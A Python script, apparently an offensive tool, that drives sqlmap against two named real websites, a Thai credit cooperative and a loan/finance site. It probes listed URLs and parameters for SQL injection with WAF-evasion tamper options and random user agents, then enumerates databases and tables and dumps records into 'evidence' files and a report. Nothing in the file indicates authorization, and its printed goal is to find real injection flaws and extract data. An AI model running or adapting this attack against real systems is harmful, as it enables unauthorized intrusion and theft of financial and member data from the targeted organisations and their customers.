#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
真实目标SQLMap攻击器 - 专门针对peacoop.or.th和ngoenmun.com
Real Target SQLMap Attacker - Specifically for peacoop.or.th and ngoenmun.com
"""

import subprocess
import json
import os
import time
from datetime import datetime

class RealTargetSQLMapAttacker:
    def __init__(self):
        # 我们要攻击的真实目标
        self.targets = [
            {
                "name": "Peacoop Credit Union",
                "base_url": "https://peacoop.or.th",
                "test_urls": [
                    "https://peacoop.or.th/members?id=1",
                    "https://peacoop.or.th/?page=1",
                    "https://peacoop.or.th/?cat=1",
                    "https://peacoop.or.th/?post=1",
                    "https://peacoop.or.th/wp-json/wp/v2/users/1",
                    "https://peacoop.or.th/wp-json/wp/v2/posts/1"
                ],
                "parameters": ["id", "page", "cat", "post", "user"]
            },
            {
                "name": "NgoenMun Finance",
                "base_url": "https://ngoenmun.com",
                "test_urls": [
                    "https://ngoenmun.com/api/v1/users?id=1",
                    "https://ngoenmun.com/?page=1",
                    "https://ngoenmun.com/?cat=1",
                    "https://ngoenmun.com/?user=1",
                    "https://ngoenmun.com/search?q=test",
                    "https://ngoenmun.com/loan?id=1"
                ],
                "parameters": ["id", "page", "cat", "user", "q", "loan"]
            }
        ]

        self.successful_attacks = []
        self.output_dir = f"real_target_sqlmap_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)

    def attack_real_targets(self):
        """攻击真实目标"""
        print("=" * 80)
        print("真实目标SQLMap攻击器")
        print("目标: peacoop.or.th 和 ngoenmun.com")
        print("目的: 寻找真实SQL注入漏洞并提取数据")
        print("=" * 80)
        print(f"输出目录: {self.output_dir}")
        print("=" * 80)

        for target in self.targets:
            print(f"\n{'='*60}")
            print(f"攻击目标: {target['name']}")
            print(f"基础URL: {target['base_url']}")
            print(f"测试URL数量: {len(target['test_urls'])}")
            print(f"测试参数: {target['parameters']}")
            print(f"{'='*60}")

            # 逐一测试每个URL
            for i, test_url in enumerate(target['test_urls'], 1):
                print(f"\n[测试 {i}/{len(target['test_urls'])}] {test_url}")

                # 尝试不同的参数
                for param in target['parameters']:
                    if param in test_url:
                        print(f"  [参数测试] {param}")

                        # 创建目标目录
                        url_name = f"{target['name'].replace(' ', '_')}_{i}_{param}"
                        target_dir = os.path.join(self.output_dir, url_name)
                        os.makedirs(target_dir, exist_ok=True)

                        # 执行SQLMap攻击
                        success = self._run_sqlmap_attack(test_url, param, target, target_dir)

                        if success:
                            print(f"    [SUCCESS] 发现SQL注入漏洞!")
                            attack_info = {
                                "target": target,
                                "url": test_url,
                                "parameter": param,
                                "directory": target_dir
                            }
                            self.successful_attacks.append(attack_info)

                            # 尝试数据提取
                            self._extract_data(test_url, param, target, target_dir)
                            break  # 发现漏洞后继续下一个URL
                    else:
                        # 尝试为URL添加参数
                        modified_url = f"{test_url}&{param}=1" if "?" in test_url else f"{test_url}?{param}=1"
                        print(f"  [参数测试] {param} (添加参数)")

                        url_name = f"{target['name'].replace(' ', '_')}_{i}_{param}_added"
                        target_dir = os.path.join(self.output_dir, url_name)
                        os.makedirs(target_dir, exist_ok=True)

                        success = self._run_sqlmap_attack(modified_url, param, target, target_dir)

                        if success:
                            print(f"    [SUCCESS] 发现SQL注入漏洞!")
                            attack_info = {
                                "target": target,
                                "url": modified_url,
                                "parameter": param,
                                "directory": target_dir
                            }
                            self.successful_attacks.append(attack_info)

                            # 尝试数据提取
                            self._extract_data(modified_url, param, target, target_dir)
                            break

        # 生成最终报告
        self._generate_attack_report()

    def _run_sqlmap_attack(self, url, parameter, target, target_dir):
        """执行SQLMap攻击"""
        # 构建SQLMap命令
        cmd = [
            "sqlmap",
            "-u", url,
            "-p", parameter,
            "--batch",
            "--level=2",
            "--risk=2",
            "--random-agent",
            "--tamper=space2comment,randomcase",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=60",
            "--retries=1"
        ]

        print(f"    [命令] {' '.join(cmd)}")

        try:
            start_time = time.time()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=180  # 3分钟超时
            )
            end_time = time.time()

            execution_time = end_time - start_time

            # 保存命令和输出
            with open(os.path.join(target_dir, "sqlmap_command.txt"), 'w') as f:
                f.write(f"目标: {target['name']}\n")
                f.write(f"URL: {url}\n")
                f.write(f"参数: {parameter}\n")
                f.write(f"执行时间: {execution_time:.2f}秒\n")
                f.write(f"命令: {' '.join(cmd)}\n")
                f.write("=" * 50 + "\n")
                f.write("STDOUT:\n")
                f.write(result.stdout)
                f.write("\n" + "=" * 50 + "\n")
                f.write("STDERR:\n")
                f.write(result.stderr)

            # 分析输出
            if result.returncode == 0:
                output = result.stdout.lower()

                # 检查是否发现SQL注入
                injection_indicators = [
                    "injection identified",
                    "parameter is injectable",
                    "sql injection detected",
                    "vulnerable to sql injection",
                    "boolean-based blind",
                    "error-based",
                    "time-based blind",
                    "union query"
                ]

                found_injection = any(indicator in output for indicator in injection_indicators)

                if found_injection:
                    print(f"    [发现] SQLMap检测到SQL注入漏洞! (耗时: {execution_time:.2f}秒)")

                    # 保存成功信息
                    with open(os.path.join(target_dir, "injection_found.txt"), 'w') as f:
                        f.write(f"发现SQL注入漏洞!\n")
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"URL: {url}\n")
                        f.write(f"参数: {parameter}\n")
                        f.write(f"执行时间: {execution_time:.2f}秒\n")
                        f.write("=" * 50 + "\n")
                        f.write("SQLMap输出:\n")
                        f.write(result.stdout)

                    return True
                else:
                    print(f"    [未发现] 未检测到SQL注入漏洞 (耗时: {execution_time:.2f}秒)")
                    return False
            else:
                print(f"    [错误] SQLMap执行失败 (返回码: {result.returncode})")
                return False

        except subprocess.TimeoutExpired:
            print(f"    [超时] SQLMap攻击超时")
            return False
        except Exception as e:
            print(f"    [异常] SQLMap攻击异常: {e}")
            return False

    def _extract_data(self, url, parameter, target, target_dir):
        """尝试数据提取"""
        print(f"    [数据提取] 尝试提取数据库数据...")

        # 获取数据库信息
        cmd_info = [
            "sqlmap",
            "-u", url,
            "-p", parameter,
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--banner",
            "--current-db",
            "--dbs",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=60"
        ]

        try:
            print(f"      [步骤1] 获取数据库信息...")
            result = subprocess.run(cmd_info, capture_output=True, text=True, timeout=120)

            if result.returncode == 0:
                output = result.stdout.lower()

                if "banner:" in output or "current database:" in output or "available databases" in output:
                    print(f"      [成功] 获取到数据库信息")

                    # 保存数据库信息
                    with open(os.path.join(target_dir, "database_info.txt"), 'w') as f:
                        f.write(f"数据库信息:\n")
                        f.write(result.stdout)

                    # 尝试获取表
                    self._get_tables(url, parameter, target_dir)
                else:
                    print(f"      [信息] 无法获取数据库信息")
            else:
                print(f"      [失败] 获取数据库信息失败")

        except Exception as e:
            print(f"      [异常] 数据提取异常: {e}")

    def _get_tables(self, url, parameter, target_dir):
        """获取数据表"""
        print(f"      [步骤2] 获取数据表列表...")

        cmd_tables = [
            "sqlmap",
            "-u", url,
            "-p", parameter,
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--tables",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=90"
        ]

        try:
            result = subprocess.run(cmd_tables, capture_output=True, text=True, timeout=180)

            if result.returncode == 0:
                output = result.stdout
                if "tables:" in output.lower() or "|" in output:
                    print(f"      [成功] 获取到数据表列表")

                    # 保存表信息
                    with open(os.path.join(target_dir, "tables_list.txt"), 'w') as f:
                        f.write(f"数据表列表:\n")
                        f.write(result.stdout)

                    # 尝试转储一些数据
                    self._dump_sample_data(url, parameter, target_dir)
                else:
                    print(f"      [信息] 无法获取数据表列表")
            else:
                print(f"      [失败] 获取数据表列表失败")

        except Exception as e:
            print(f"      [异常] 获取表异常: {e}")

    def _dump_sample_data(self, url, parameter, target_dir):
        """转储样本数据"""
        print(f"      [步骤3] 转储样本数据...")

        cmd_dump = [
            "sqlmap",
            "-u", url,
            "-p", parameter,
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--dump",
            "--limit=10",
            "--output-dir", target_dir,
            "--fresh-queries",
            "--timeout=120"
        ]

        try:
            result = subprocess.run(cmd_dump, capture_output=True, text=True, timeout=240)

            if result.returncode == 0:
                output = result.stdout
                if "table" in output.lower() and "dumped" in output.lower():
                    print(f"      [成功] 成功转储样本数据!")

                    # 保存转储数据
                    with open(os.path.join(target_dir, "dumped_data.txt"), 'w') as f:
                        f.write(f"转储的数据:\n")
                        f.write(result.stdout)

                    print(f"      [凭证] 真实SQLMap数据提取凭证已生成!")
                else:
                    print(f"      [信息] 无法转储数据")
            else:
                print(f"      [失败] 数据转储失败")

        except Exception as e:
            print(f"      [异常] 数据转储异常: {e}")

    def _generate_attack_report(self):
        """生成攻击报告"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"real_target_sqlmap_report_{timestamp}.json"

        report = {
            "attack_summary": {
                "timestamp": timestamp,
                "tool": "Real Target SQLMap Attacker v1.0",
                "targets_tested": len(self.targets),
                "successful_attacks": len(self.successful_attacks),
                "output_directory": self.output_dir
            },
            "targets": [],
            "successful_attacks": self.successful_attacks,
            "verification_commands": [],
            "evidence_summary": {}
        }

        # 添加目标信息
        for target in self.targets:
            report["targets"].append({
                "name": target["name"],
                "base_url": target["base_url"],
                "test_urls_count": len(target["test_urls"]),
                "parameters": target["parameters"]
            })

        # 收集证据信息
        for attack in self.successful_attacks:
            target_dir = attack["directory"]
            if os.path.exists(target_dir):
                evidence_files = []
                for file in os.listdir(target_dir):
                    if os.path.isfile(os.path.join(target_dir, file)):
                        evidence_files.append(file)

                if evidence_files:
                    report["evidence_summary"][os.path.basename(target_dir)] = {
                        "directory": target_dir,
                        "evidence_files": evidence_files,
                        "attack_info": {
                            "target": attack["target"]["name"],
                            "url": attack["url"],
                            "parameter": attack["parameter"]
                        }
                    }

                    # 生成验证命令
                    report["verification_commands"].append({
                        "target": attack["target"]["name"],
                        "url": attack["url"],
                        "parameter": attack["parameter"],
                        "command": f"sqlmap -u \"{attack['url']}\" -p {attack['parameter']} --batch --level=1 --risk=1 --random-agent --output-dir {target_dir} --fresh-queries"
                    })

        # 保存报告
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n{'='*80}")
        print(f"真实目标SQLMap攻击完成!")
        print(f"{'='*80}")
        print(f"攻击目标: {report['attack_summary']['targets_tested']} 个")
        print(f"成功攻击: {report['attack_summary']['successful_attacks']} 个")
        print(f"报告文件: {report_file}")
        print(f"证据目录: {self.output_dir}")

        if self.successful_attacks:
            print(f"\n🎯 成功发现SQL注入漏洞:")
            for attack in self.successful_attacks:
                print(f"  - {attack['target']['name']}: {attack['url']} (参数: {attack['parameter']})")
            print(f"\n✅ 真实SQLMap凭证已生成!")
            print(f"✅ 所有攻击都可以重现验证!")
            print(f"✅ 凭证位置: {self.output_dir}/")
        else:
            print(f"\n❌ 未在目标中发现可利用的SQL注入漏洞")
            print(f"💡 可能原因:")
            print(f"   - 目标可能没有SQL注入漏洞")
            print(f"   - 目标可能有WAF保护")
            print(f"   - 需要更高级的绕过技术")

def main():
    attacker = RealTargetSQLMapAttacker()
    attacker.attack_real_targets()

if __name__ == "__main__":
    main()